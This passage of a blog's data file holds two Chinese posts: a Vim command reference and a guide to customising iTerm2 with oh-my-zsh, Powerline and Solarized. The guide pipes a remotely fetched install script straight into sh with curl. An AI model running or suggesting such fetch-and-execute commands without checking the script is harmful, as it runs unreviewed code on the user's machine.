filename：打开文件filename进行编辑\n\n：x：保存当前文件并退出\n\n：q：退出vi\n\n：q!：不保存文件并退出vi\n\n：!command：执行shell命令command\n\n：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入\n\n：r!command：将命令command的输出结果放到当前行\n\n## 寄存器操作\n\n\"?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字\n\nndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。","source":"_posts/Vim-命令大全.md","raw":"---\ntitle: Vim 命令大全\ntags: 'Linux'\npermalink: vimda-quan\nid: 3\nupdated: '2016-08-05 21:14:15'\ndate: 2016-07-28 10:16:13\n---\n<!-- more --> \n## \n**进入vi的命令**\n\nvi filename :打开或新建文件，并将光标置于第一行首\n\nvi +n filename ：打开文件，并将光标置于第n行首\n\nvi + filename ：打开文件，并将光标置于最后一行首\n\nvi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处\n\nvi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename\n\nvi filename....filename ：打开多个文件，依次进行编辑\n\n## 移动光标类命令\n\nh ：光标左移一个字符\n\nl ：光标右移一个字符\n\nspace：光标右移一个字符\n\nBackspace：光标左移一个字符\n\nk或Ctrl+p：光标上移一行\n\nj或Ctrl+n ：光标下移一行\n\nEnter ：光标下移一行\n\nw或W ：光标右移一个字至字首\n\nb或B ：光标左移一个字至字首\n\ne或E ：光标右移一个字至字尾\n\n) ：光标移至句尾\n\n( ：光标移至句首\n\n}：光标移至段落开头\n\n{：光标移至段落结尾\n\nnG：光标移至第n行首\n\nn+：光标下移n行\n\nn-：光标上移n行\n\nn$：光标移至第n行尾\n\nH ：光标移至屏幕顶行\n\nM ：光标移至屏幕中间行\n\nL ：光标移至屏幕最后行\n\n0：（注意是数字零）光标移至当前行首\n\n$：光标移至当前行尾\n\n## 屏幕翻滚类命令\n\nCtrl+u：向文件首翻半屏\n\nCtrl+d：向文件尾翻半屏\n\nCtrl+f：向文件尾翻一屏\n\nCtrl＋b；向文件首翻一屏\n\nnz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。\n\n## 插入文本类命令\n\ni ：在光标前\n\nI ：在当前行首\n\na：光标后\n\nA：在当前行尾\n\no：在当前行之下新开一行\n\nO：在当前行之上新开一行\n\nr：替换当前字符\n\nR：替换当前字符及其后的字符，直至按ESC键\n\ns：从当前光标位置处开始，以输入的文本替代指定数目的字符\n\nS：删除指定数目的行，并以所输入文本代替之\n\nncw或nCW：修改指定数目的字\n\nnCC：修改指定数目的行\n\n## 删除命令\n\nndw或ndW：删除光标处开始及其后的n-1个字\n\ndo：删至行首\n\nd$：删至行尾\n\nndd：删除当前行及其后n-1行\n\nx或X：删除一个字符，x删除光标后的，而X删除光标前的\n\nCtrl+u：删除输入方式下所输入的文本\n\n## 搜索及替换命令\n\n/pattern：从光标开始处向文件尾搜索pattern\n\n?pattern：从光标开始处向文件首搜索pattern\n\nn：在同一方向重复上一次搜索命令\n\nN：在反方向上重复上一次搜索命令\n\n：s/p1/p2/g：将当前行中所有p1均用p2替代\n\n：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代\n\n：g/p1/s//p2/g：将文件中所有p1均用p2替换\n\n## 选项设置\n\nall：列出所有选项设置情况\n\nterm：设置终端类型\n\nignorance：在搜索中忽略大小写\n\nlist：显示制表位(Ctrl+I)和行尾标志（$)\n\nnumber：显示行号\n\nreport：显示由面向行的命令修改过的数目\n\nterse：显示简短的警告信息\n\nwarn：在转到别的文件时若没保存当前文件则显示NO write信息\n\nnomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符\n\nnowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始\n\nmesg：允许vi显示其他用户用write写到自己终端上的信息\n\n## 最后行方式命令\n\n：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下\n\n：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下\n\n：n1,n2 d ：将n1行到n2行之间的内容删除\n\n：w ：保存当前文件\n\n：e filename：打开文件filename进行编辑\n\n：x：保存当前文件并退出\n\n：q：退出vi\n\n：q!：不保存文件并退出vi\n\n：!command：执行shell命令command\n\n：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入\n\n：r!command：将命令command的输出结果放到当前行\n\n## 寄存器操作\n\n\"?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字\n\nndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。","slug":"vimda-quan","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym300q000kcdon055numlt","content":"<a id=\"more\"></a> \n<p>##<br><strong>进入vi的命令</strong></p>\n<p>vi filename :打开或新建文件，并将光标置于第一行首</p>\n<p>vi +n filename ：打开文件，并将光标置于第n行首</p>\n<p>vi + filename ：打开文件，并将光标置于最后一行首</p>\n<p>vi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处</p>\n<p>vi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename</p>\n<p>vi filename….filename ：打开多个文件，依次进行编辑</p>\n<h2 id=\"移动光标类命令\"><a href=\"#移动光标类命令\" class=\"headerlink\" title=\"移动光标类命令\"></a>移动光标类命令</h2><p>h ：光标左移一个字符</p>\n<p>l ：光标右移一个字符</p>\n<p>space：光标右移一个字符</p>\n<p>Backspace：光标左移一个字符</p>\n<p>k或Ctrl+p：光标上移一行</p>\n<p>j或Ctrl+n ：光标下移一行</p>\n<p>Enter ：光标下移一行</p>\n<p>w或W ：光标右移一个字至字首</p>\n<p>b或B ：光标左移一个字至字首</p>\n<p>e或E ：光标右移一个字至字尾</p>\n<p>) ：光标移至句尾</p>\n<p>( ：光标移至句首</p>\n<p>}：光标移至段落开头</p>\n<p>{：光标移至段落结尾</p>\n<p>nG：光标移至第n行首</p>\n<p>n+：光标下移n行</p>\n<p>n-：光标上移n行</p>\n<p>n$：光标移至第n行尾</p>\n<p>H ：光标移至屏幕顶行</p>\n<p>M ：光标移至屏幕中间行</p>\n<p>L ：光标移至屏幕最后行</p>\n<p>0：（注意是数字零）光标移至当前行首</p>\n<p>$：光标移至当前行尾</p>\n<h2 id=\"屏幕翻滚类命令\"><a href=\"#屏幕翻滚类命令\" class=\"headerlink\" title=\"屏幕翻滚类命令\"></a>屏幕翻滚类命令</h2><p>Ctrl+u：向文件首翻半屏</p>\n<p>Ctrl+d：向文件尾翻半屏</p>\n<p>Ctrl+f：向文件尾翻一屏</p>\n<p>Ctrl＋b；向文件首翻一屏</p>\n<p>nz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。</p>\n<h2 id=\"插入文本类命令\"><a href=\"#插入文本类命令\" class=\"headerlink\" title=\"插入文本类命令\"></a>插入文本类命令</h2><p>i ：在光标前</p>\n<p>I ：在当前行首</p>\n<p>a：光标后</p>\n<p>A：在当前行尾</p>\n<p>o：在当前行之下新开一行</p>\n<p>O：在当前行之上新开一行</p>\n<p>r：替换当前字符</p>\n<p>R：替换当前字符及其后的字符，直至按ESC键</p>\n<p>s：从当前光标位置处开始，以输入的文本替代指定数目的字符</p>\n<p>S：删除指定数目的行，并以所输入文本代替之</p>\n<p>ncw或nCW：修改指定数目的字</p>\n<p>nCC：修改指定数目的行</p>\n<h2 id=\"删除命令\"><a href=\"#删除命令\" class=\"headerlink\" title=\"删除命令\"></a>删除命令</h2><p>ndw或ndW：删除光标处开始及其后的n-1个字</p>\n<p>do：删至行首</p>\n<p>d$：删至行尾</p>\n<p>ndd：删除当前行及其后n-1行</p>\n<p>x或X：删除一个字符，x删除光标后的，而X删除光标前的</p>\n<p>Ctrl+u：删除输入方式下所输入的文本</p>\n<h2 id=\"搜索及替换命令\"><a href=\"#搜索及替换命令\" class=\"headerlink\" title=\"搜索及替换命令\"></a>搜索及替换命令</h2><p>/pattern：从光标开始处向文件尾搜索pattern</p>\n<p>?pattern：从光标开始处向文件首搜索pattern</p>\n<p>n：在同一方向重复上一次搜索命令</p>\n<p>N：在反方向上重复上一次搜索命令</p>\n<p>：s/p1/p2/g：将当前行中所有p1均用p2替代</p>\n<p>：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代</p>\n<p>：g/p1/s//p2/g：将文件中所有p1均用p2替换</p>\n<h2 id=\"选项设置\"><a href=\"#选项设置\" class=\"headerlink\" title=\"选项设置\"></a>选项设置</h2><p>all：列出所有选项设置情况</p>\n<p>term：设置终端类型</p>\n<p>ignorance：在搜索中忽略大小写</p>\n<p>list：显示制表位(Ctrl+I)和行尾标志（$)</p>\n<p>number：显示行号</p>\n<p>report：显示由面向行的命令修改过的数目</p>\n<p>terse：显示简短的警告信息</p>\n<p>warn：在转到别的文件时若没保存当前文件则显示NO write信息</p>\n<p>nomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符</p>\n<p>nowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始</p>\n<p>mesg：允许vi显示其他用户用write写到自己终端上的信息</p>\n<h2 id=\"最后行方式命令\"><a href=\"#最后行方式命令\" class=\"headerlink\" title=\"最后行方式命令\"></a>最后行方式命令</h2><p>：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下</p>\n<p>：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下</p>\n<p>：n1,n2 d ：将n1行到n2行之间的内容删除</p>\n<p>：w ：保存当前文件</p>\n<p>：e filename：打开文件filename进行编辑</p>\n<p>：x：保存当前文件并退出</p>\n<p>：q：退出vi</p>\n<p>：q!：不保存文件并退出vi</p>\n<p>：!command：执行shell命令command</p>\n<p>：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入</p>\n<p>：r!command：将命令command的输出结果放到当前行</p>\n<h2 id=\"寄存器操作\"><a href=\"#寄存器操作\" class=\"headerlink\" title=\"寄存器操作\"></a>寄存器操作</h2><p>“?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字</p>\n<p>ndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。</p>\n","excerpt":"","more":"<p>##<br><strong>进入vi的命令</strong></p>\n<p>vi filename :打开或新建文件，并将光标置于第一行首</p>\n<p>vi +n filename ：打开文件，并将光标置于第n行首</p>\n<p>vi + filename ：打开文件，并将光标置于最后一行首</p>\n<p>vi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处</p>\n<p>vi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename</p>\n<p>vi filename….filename ：打开多个文件，依次进行编辑</p>\n<h2 id=\"移动光标类命令\"><a href=\"#移动光标类命令\" class=\"headerlink\" title=\"移动光标类命令\"></a>移动光标类命令</h2><p>h ：光标左移一个字符</p>\n<p>l ：光标右移一个字符</p>\n<p>space：光标右移一个字符</p>\n<p>Backspace：光标左移一个字符</p>\n<p>k或Ctrl+p：光标上移一行</p>\n<p>j或Ctrl+n ：光标下移一行</p>\n<p>Enter ：光标下移一行</p>\n<p>w或W ：光标右移一个字至字首</p>\n<p>b或B ：光标左移一个字至字首</p>\n<p>e或E ：光标右移一个字至字尾</p>\n<p>) ：光标移至句尾</p>\n<p>( ：光标移至句首</p>\n<p>}：光标移至段落开头</p>\n<p>{：光标移至段落结尾</p>\n<p>nG：光标移至第n行首</p>\n<p>n+：光标下移n行</p>\n<p>n-：光标上移n行</p>\n<p>n$：光标移至第n行尾</p>\n<p>H ：光标移至屏幕顶行</p>\n<p>M ：光标移至屏幕中间行</p>\n<p>L ：光标移至屏幕最后行</p>\n<p>0：（注意是数字零）光标移至当前行首</p>\n<p>$：光标移至当前行尾</p>\n<h2 id=\"屏幕翻滚类命令\"><a href=\"#屏幕翻滚类命令\" class=\"headerlink\" title=\"屏幕翻滚类命令\"></a>屏幕翻滚类命令</h2><p>Ctrl+u：向文件首翻半屏</p>\n<p>Ctrl+d：向文件尾翻半屏</p>\n<p>Ctrl+f：向文件尾翻一屏</p>\n<p>Ctrl＋b；向文件首翻一屏</p>\n<p>nz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。</p>\n<h2 id=\"插入文本类命令\"><a href=\"#插入文本类命令\" class=\"headerlink\" title=\"插入文本类命令\"></a>插入文本类命令</h2><p>i ：在光标前</p>\n<p>I ：在当前行首</p>\n<p>a：光标后</p>\n<p>A：在当前行尾</p>\n<p>o：在当前行之下新开一行</p>\n<p>O：在当前行之上新开一行</p>\n<p>r：替换当前字符</p>\n<p>R：替换当前字符及其后的字符，直至按ESC键</p>\n<p>s：从当前光标位置处开始，以输入的文本替代指定数目的字符</p>\n<p>S：删除指定数目的行，并以所输入文本代替之</p>\n<p>ncw或nCW：修改指定数目的字</p>\n<p>nCC：修改指定数目的行</p>\n<h2 id=\"删除命令\"><a href=\"#删除命令\" class=\"headerlink\" title=\"删除命令\"></a>删除命令</h2><p>ndw或ndW：删除光标处开始及其后的n-1个字</p>\n<p>do：删至行首</p>\n<p>d$：删至行尾</p>\n<p>ndd：删除当前行及其后n-1行</p>\n<p>x或X：删除一个字符，x删除光标后的，而X删除光标前的</p>\n<p>Ctrl+u：删除输入方式下所输入的文本</p>\n<h2 id=\"搜索及替换命令\"><a href=\"#搜索及替换命令\" class=\"headerlink\" title=\"搜索及替换命令\"></a>搜索及替换命令</h2><p>/pattern：从光标开始处向文件尾搜索pattern</p>\n<p>?pattern：从光标开始处向文件首搜索pattern</p>\n<p>n：在同一方向重复上一次搜索命令</p>\n<p>N：在反方向上重复上一次搜索命令</p>\n<p>：s/p1/p2/g：将当前行中所有p1均用p2替代</p>\n<p>：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代</p>\n<p>：g/p1/s//p2/g：将文件中所有p1均用p2替换</p>\n<h2 id=\"选项设置\"><a href=\"#选项设置\" class=\"headerlink\" title=\"选项设置\"></a>选项设置</h2><p>all：列出所有选项设置情况</p>\n<p>term：设置终端类型</p>\n<p>ignorance：在搜索中忽略大小写</p>\n<p>list：显示制表位(Ctrl+I)和行尾标志（$)</p>\n<p>number：显示行号</p>\n<p>report：显示由面向行的命令修改过的数目</p>\n<p>terse：显示简短的警告信息</p>\n<p>warn：在转到别的文件时若没保存当前文件则显示NO write信息</p>\n<p>nomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符</p>\n<p>nowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始</p>\n<p>mesg：允许vi显示其他用户用write写到自己终端上的信息</p>\n<h2 id=\"最后行方式命令\"><a href=\"#最后行方式命令\" class=\"headerlink\" title=\"最后行方式命令\"></a>最后行方式命令</h2><p>：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下</p>\n<p>：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下</p>\n<p>：n1,n2 d ：将n1行到n2行之间的内容删除</p>\n<p>：w ：保存当前文件</p>\n<p>：e filename：打开文件filename进行编辑</p>\n<p>：x：保存当前文件并退出</p>\n<p>：q：退出vi</p>\n<p>：q!：不保存文件并退出vi</p>\n<p>：!command：执行shell命令command</p>\n<p>：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入</p>\n<p>：r!command：将命令command的输出结果放到当前行</p>\n<h2 id=\"寄存器操作\"><a href=\"#寄存器操作\" class=\"headerlink\" title=\"寄存器操作\"></a>寄存器操作</h2><p>“?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字</p>\n<p>ndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。</p>"},{"title":"iTerm2 美化全过程","id":"2","updated":"2016-08-05T20:14:29.000Z","date":"2016-07-28T08:49:20.000Z","_content":"\n\n本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。\n# 1.首先下载 iTerm 2\n# 2.打开iTerm 2\n# 3.输入下面指令安装oh-my-zsh\n`curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh`\n# 4.接下来安装Powerline\n在官网有教程，我们只需要执行官网第一条安装指令就行\n如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装\n\n`pip install powerline-status`\n\n如果没有，则先执行安装pip指令\n\n`sudo easy_install pip`\n\n# 5.下载、安装库字体库\n1）将工程下载下来后cd到`install.sh`文件所在目录\n2）执行指令安装字体库\n\n执行`./install.sh`指令安装所有Powerline字体\n\n安装完成后提示所有字体均已下载到`/Users/superdanny/Library/Fonts`路径下\n`All Powerline fonts installed to /Users/superdanny/Library/Fonts`\n\n# 6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\n\n安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline\n\n### 7. 配色方案\n1）安装配色方案\n进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里\n\n2）配置配色方案\n通过load presets选择刚刚安装的配色主题即可\n\n### 8. 使用agnoster主题\n1）下载agnoster主题\n到下载的工程里面运行install文件,主题将安装到`~/.oh-my-zsh/themes`目录下\n\n2）设置该主题\n进入~/.zshrc打开.zshrc文件，然后将`ZSH_THEME`后面的字段改为`agnoster`。`ZSH_THEME=\"agnoster\"`（agnoster即为要设置的主题）\n\n### 9. 增加指令高亮效果——zsh-syntax-highlighting\n指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮\n\n1）cd到.zshrc所在目录\n\n2）执行指令将工程克隆到当前目录\n\n`git clone git://github.com/zsh-users/zsh-syntax-highlighting.git`\n\n3）打开.zshrc文件，在最后添加下面内容\n\n`source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh`\n\n保存文件。\n\n注意：xxx代表`.zshrc`所在目录\n\n4）`cd ~/.oh-my-zsh/custom/plugins`\n\n5）再次打开`.zshrc`文件，在最后面添加下面内容`plugins=(zsh-syntax-highlighting)`保存文件。\n\n**启动iTerm 2 默认使用dash改用zsh解决方法：**\n`chsh -s /bin/zsh`\n### Vim\n\n`$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/\n`\n`$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized`\n\n### ls\n\nMac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（`brew install coreutils`），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：\n\n`$ vi ~/.bash_profile\nexport CLICOLOR=1`\n","source":"_posts/iTerm2-美化全过程.md","raw":"---\ntitle: iTerm2 美化全过程\ntags: 'Mac'\npermalink: iterm2-mei-hua-quan-guo-cheng\nid: 2\nupdated: '2016-08-05 21:14:29'\ndate: 2016-07-28 09:49:20\n---\n\n\n本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。\n# 1.首先下载 iTerm 2\n# 2.打开iTerm 2\n# 3.输入下面指令安装oh-my-zsh\n`curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh`\n# 4.接下来安装Powerline\n在官网有教程，我们只需要执行官网第一条安装指令就行\n如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装\n\n`pip install powerline-status`\n\n如果没有，则先执行安装pip指令\n\n`sudo easy_install pip`\n\n# 5.下载、安装库字体库\n1）将工程下载下来后cd到`install.sh`文件所在目录\n2）执行指令安装字体库\n\n执行`./install.sh`指令安装所有Powerline字体\n\n安装完成后提示所有字体均已下载到`/Users/superdanny/Library/Fonts`路径下\n`All Powerline fonts installed to /Users/superdanny/Library/Fonts`\n\n# 6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\n\n安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline\n\n### 7. 配色方案\n1）安装配色方案\n进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里\n\n2）配置配色方案\n通过load presets选择刚刚安装的配色主题即可\n\n### 8. 使用agnoster主题\n1）下载agnoster主题\n到下载的工程里面运行install文件,主题将安装到`~/.oh-my-zsh/themes`目录下\n\n2）设置该主题\n进入~/.zshrc打开.zshrc文件，然后将`ZSH_THEME`后面的字段改为`agnoster`。`ZSH_THEME=\"agnoster\"`（agnoster即为要设置的主题）\n\n### 9. 增加指令高亮效果——zsh-syntax-highlighting\n指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮\n\n1）cd到.zshrc所在目录\n\n2）执行指令将工程克隆到当前目录\n\n`git clone git://github.com/zsh-users/zsh-syntax-highlighting.git`\n\n3）打开.zshrc文件，在最后添加下面内容\n\n`source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh`\n\n保存文件。\n\n注意：xxx代表`.zshrc`所在目录\n\n4）`cd ~/.oh-my-zsh/custom/plugins`\n\n5）再次打开`.zshrc`文件，在最后面添加下面内容`plugins=(zsh-syntax-highlighting)`保存文件。\n\n**启动iTerm 2 默认使用dash改用zsh解决方法：**\n`chsh -s /bin/zsh`\n### Vim\n\n`$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/\n`\n`$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized`\n\n### ls\n\nMac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（`brew install coreutils`），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：\n\n`$ vi ~/.bash_profile\nexport CLICOLOR=1`\n","slug":"iterm2-mei-hua-quan-guo-cheng","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym300s000ocdonqs2ei5e0","content":"<p>本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。</p>\n<h1 id=\"1-首先下载-iTerm-2\"><a href=\"#1-首先下载-iTerm-2\" class=\"headerlink\" title=\"1.首先下载 iTerm 2\"></a>1.首先下载 iTerm 2</h1><h1 id=\"2-打开iTerm-2\"><a href=\"#2-打开iTerm-2\" class=\"headerlink\" title=\"2.打开iTerm 2\"></a>2.打开iTerm 2</h1><h1 id=\"3-输入下面指令安装oh-my-zsh\"><a href=\"#3-输入下面指令安装oh-my-zsh\" class=\"headerlink\" title=\"3.输入下面指令安装oh-my-zsh\"></a>3.输入下面指令安装oh-my-zsh</h1><p><code>curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh</code></p>\n<h1 id=\"4-接下来安装Powerline\"><a href=\"#4-接下来安装Powerline\" class=\"headerlink\" title=\"4.接下来安装Powerline\"></a>4.接下来安装Powerline</h1><p>在官网有教程，我们只需要执行官网第一条安装指令就行<br>如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装</p>\n<p><code>pip install powerline-status</code></p>\n<p>如果没有，则先执行安装pip指令</p>\n<p><code>sudo easy_install pip</code></p>\n<h1 id=\"5-下载、安装库字体库\"><a href=\"#5-下载、安装库字体库\" class=\"headerlink\" title=\"5.下载、安装库字体库\"></a>5.下载、安装库字体库</h1><p>1）将工程下载下来后cd到<code>install.sh</code>文件所在目录<br>2）执行指令安装字体库</p>\n<p>执行<code>./install.sh</code>指令安装所有Powerline字体</p>\n<p>安装完成后提示所有字体均已下载到<code>/Users/superdanny/Library/Fonts</code>路径下<br><code>All Powerline fonts installed to /Users/superdanny/Library/Fonts</code></p>\n<h1 id=\"6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\"><a href=\"#6-设置iTerm-2的Regular-Font-和-Non-ASCII-Font\" class=\"headerlink\" title=\"6. 设置iTerm 2的Regular Font 和 Non-ASCII Font\"></a>6. 设置iTerm 2的Regular Font 和 Non-ASCII Font</h1><p>安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline</p>\n<h3 id=\"7-配色方案\"><a href=\"#7-配色方案\" class=\"headerlink\" title=\"7. 配色方案\"></a>7. 配色方案</h3><p>1）安装配色方案<br>进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里</p>\n<p>2）配置配色方案<br>通过load presets选择刚刚安装的配色主题即可</p>\n<h3 id=\"8-使用agnoster主题\"><a href=\"#8-使用agnoster主题\" class=\"headerlink\" title=\"8. 使用agnoster主题\"></a>8. 使用agnoster主题</h3><p>1）下载agnoster主题<br>到下载的工程里面运行install文件,主题将安装到<code>~/.oh-my-zsh/themes</code>目录下</p>\n<p>2）设置该主题<br>进入~/.zshrc打开.zshrc文件，然后将<code>ZSH_THEME</code>后面的字段改为<code>agnoster</code>。<code>ZSH_THEME=&quot;agnoster&quot;</code>（agnoster即为要设置的主题）</p>\n<h3 id=\"9-增加指令高亮效果——zsh-syntax-highlighting\"><a href=\"#9-增加指令高亮效果——zsh-syntax-highlighting\" class=\"headerlink\" title=\"9. 增加指令高亮效果——zsh-syntax-highlighting\"></a>9. 增加指令高亮效果——zsh-syntax-highlighting</h3><p>指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮</p>\n<p>1）cd到.zshrc所在目录</p>\n<p>2）执行指令将工程克隆到当前目录</p>\n<p><code>git clone git://github.com/zsh-users/zsh-syntax-highlighting.git</code></p>\n<p>3）打开.zshrc文件，在最后添加下面内容</p>\n<p><code>source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</code></p>\n<p>保存文件。</p>\n<p>注意：xxx代表<code>.zshrc</code>所在目录</p>\n<p>4）<code>cd ~/.oh-my-zsh/custom/plugins</code></p>\n<p>5）再次打开<code>.zshrc</code>文件，在最后面添加下面内容<code>plugins=(zsh-syntax-highlighting)</code>保存文件。</p>\n<p><strong>启动iTerm 2 默认使用dash改用zsh解决方法：</strong><br><code>chsh -s /bin/zsh</code></p>\n<h3 id=\"Vim\"><a href=\"#Vim\" class=\"headerlink\" title=\"Vim\"></a>Vim</h3><p><code>$ cd solarized\n$ cd vim-colors-solarized/colors\n$ mkdir -p ~/.vim/colors\n$ cp solarized.vim ~/.vim/colors/</code><br><code>$ vi ~/.vimrc\nsyntax enable\nset background=dark\ncolorscheme solarized</code></p>\n<h3 id=\"ls\"><a href=\"#ls\" class=\"headerlink\" title=\"ls\"></a>ls</h3><p>Mac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（<code>brew install coreutils</code>），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1：</p>\n<p><code>$ vi ~/.bash_profile\nexport CLICOLOR=1</code></p>\n","excerpt":"","more":"<p>本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。</p>\n<h1 id=\"1-首先下载-iTerm-2\"><a href=\"#1-首先下载-iTerm-2\" class=\"headerlink\" title=\"1.首先下载 iTerm 2\"></a>1.首先下载 iTerm 2</h1><h1 id=\"2-打开iTerm-2\"><a href=\"#2-打开iTerm-2\" class=\"headerlink\" title=\"2.打开iTerm 2\"></a>2.打开iTerm 2</h1><h1 id=\"3-输入下面指令安装oh-my-zsh\"><a href=\"#3-输入下面指令安装oh-my-zsh\" class=\"headerlink\" title=\"3.输入下面指令安装oh-my-zsh\"></a>3.输入下面指令安装oh-my-zsh</h1><p><code>curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh</code></p>\n<h1 id=\"4-接下来安装Powerline\"><a 